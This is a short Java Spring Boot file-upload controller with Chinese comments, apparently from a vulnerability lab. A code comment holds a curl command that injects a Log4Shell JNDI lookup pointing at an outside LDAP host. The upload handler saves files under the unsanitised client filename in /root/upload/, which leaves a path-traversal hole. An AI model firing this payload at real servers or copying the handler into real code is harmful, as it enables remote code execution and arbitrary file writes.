package com.example.test.controller;

import org.springframework.util.FileCopyUtils;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import javax.servlet.http.HttpServletRequest;
import java.io.*;

@RestController
public class FileUpload {
    //    curl --location --request POST '192.73.0.18:8080/demo-0.0.1-SNAPSHOT/loginIn' --form 'username="${jndi:ldap://192.73.1.63:1389/Exploit}"'
    //    Spring Boot工程嵌入的tomcat限制了请求的文件大小
    @PostMapping("/upload")
    @CrossOrigin
//    public String SingleFileUpLoad(@RequestParam("myfile") MultipartFile file) throws IOException {
    public String SingleFileUpLoad(MultipartFile file, HttpServletRequest req) throws IOException {
        //判断文件是否为空
        if (file.isEmpty()) {
            return "file is null";
        }
        //创建输入输出流
        InputStream inputStream = null;
        OutputStream outputStream = null;
        //获取文件的输入流
        inputStream = file.getInputStream();
        //获取上传时的文件名
        String fileName = file.getOriginalFilename();
        System.out.println(fileName);
//        String path="E:\\Bug_Demo\\xxe-lab-master\\ssm02_18\\target\\ssm02_18\\upload";
        //指定上传的位置为 d:/upload/
//        String path = "D:\\upload\\";
        String path = "/root/upload/";
        //注意是路径+文件名
        File targetFile = new File(path + fileName);
        //获取文件的输出流
        outputStream = new FileOutputStream(targetFile);
        //最后使用资源访问器FileCopyUtils的copy方法拷贝文件
        FileCopyUtils.copy(inputStream, outputStream);
        return "success";
    }
}